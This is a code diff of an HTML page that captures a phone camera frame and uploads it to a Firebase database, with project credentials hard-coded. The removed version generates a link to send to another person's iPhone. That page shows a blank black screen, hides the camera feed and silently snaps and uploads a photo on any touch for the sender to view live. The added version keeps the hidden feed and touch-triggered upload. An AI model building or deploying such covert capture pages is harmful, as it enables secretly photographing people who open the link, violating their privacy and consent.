@@ -2,92 +2,71 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Secure Snap Setup</title>
+  <title>Live Photo Sync - Touch Only</title>
   <style>
     body {
-      margin: 0;
-      font-family: sans-serif;
-      text-align: center;
-    }
-    .center {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    input, button {
-      padding: 10px;
-      font-size: 18px;
-      margin: 10px;
-    }
-    img {
-      margin-top: 20px;
-      max-width: 90%;
-      border: 2px solid black;
-    }
-    #black {
       background: black;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      overflow-y: scroll;
+      font-family: sans-serif;
+    }
+    #captureArea {
+      height: 100vh;
+      width: 100vw;
+    }
+    #result {
+      text-align: center;
+      padding: 20px;
       color: white;
     }
-    #white {
-      background: white;
-      color: black;
+    #livePhoto {
+      width: 90%;
+      max-width: 400px;
+      margin-top: 20px;
+      border: 2px solid white;
     }
-    video { display: none; }
   </style>
 </head>
-<body id="white">
+<body>
+  <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>
 
-<div id="main" class="center">
-  <h2>Enter Your Key</h2>
-  <input type="text" id="keyInput" placeholder="e.g. 112233">
-  <button onclick="goToSetup()">Next</button>
-</div>
+  <div id="result">
+    <h3>Captured Photo:</h3>
+    <img id="livePhoto" src="" alt="Waiting for photo..." />
+  </div>
 
-<div id="setup" class="center" style="display:none;">
-  <h2>Key: <span id="showKey"></span></h2>
-  <button onclick="generateLink()">Generate Link</button>
-  <p id="linkDisplay"></p>
-  <img id="photo" src="" alt="Waiting for photo..." />
-</div>
-
-<div id="capture" onclick="capture()" ontouchstart="capture()" style="display:none;">
-  <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-</div>
 
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-<script>
-  const firebaseConfig = {
-    apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
-    authDomain: "livesnap-d57c2.firebaseapp.com",
-    databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
-    projectId: "livesnap-d57c2",
-    storageBucket: "livesnap-d57c2.firebasestorage.app",
-    messagingSenderId: "24202813286",
-    appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
-    measurementId: "G-BR9MFH2XN6"
-  };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
+      authDomain: "livesnap-d57c2.firebaseapp.com",
+      databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "livesnap-d57c2",
+      storageBucket: "livesnap-d57c2.firebasestorage.app",
+      messagingSenderId: "24202813286",
+      appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
+      measurementId: "G-BR9MFH2XN6"
+    };
 
-  const params = new URLSearchParams(window.location.search);
-  const captureKey = params.get("capture");
-  const setupKey = params.get("setup");
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-  // === Capture Mode (iPhone) ===
-  if (captureKey) {
-    document.body.id = "black";
-    document.getElementById("capture").style.display = "block";
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const img = document.getElementById('livePhoto');
 
+    // Start camera
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
     });
 
+    // Capture on any touch
     function capture() {
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
@@ -95,39 +74,23 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const dataUrl = canvas.toDataURL("image/jpeg");
 
-      db.ref("livephoto/" + captureKey).set({
+      // Upload to Firebase
+      db.ref("livephoto").set({
         image: dataUrl,
         time: Date.now()
       });
+
+      // Smooth scroll to result
+      document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
     }
-  }
 
-  // === Setup Mode (After Key Entry) ===
-  else if (setupKey) {
-    document.getElementById("main").style.display = "none";
-    document.getElementById("setup").style.display = "flex";
-    document.getElementById("showKey").textContent = setupKey;
-
-    db.ref("livephoto/" + setupKey).on("value", snapshot => {
+    // Listen and display live image
+    db.ref("livephoto").on("value", snapshot => {
       const data = snapshot.val();
       if (data && data.image) {
-        document.getElementById("photo").src = data.image;
+        img.src = data.image;
       }
     });
-
-    window.generateLink = function () {
-      const link = window.location.origin + window.location.pathname + "?capture=" + encodeURIComponent(setupKey);
-      document.getElementById("linkDisplay").innerHTML =
-        `<b>Send this link to iPhone:</b><br><a href="${link}" target="_blank">${link}</a>`;
-    };
-  }
-
-  // === Home Page ===
-  function goToSetup() {
-    const key = document.getElementById("keyInput").value.trim();
-    if (!key) return alert("Enter a key!");
-    window.location.href = "?setup=" + encodeURIComponent(key);
-  }
-</script>
+  </script>
 </body>
 </html>
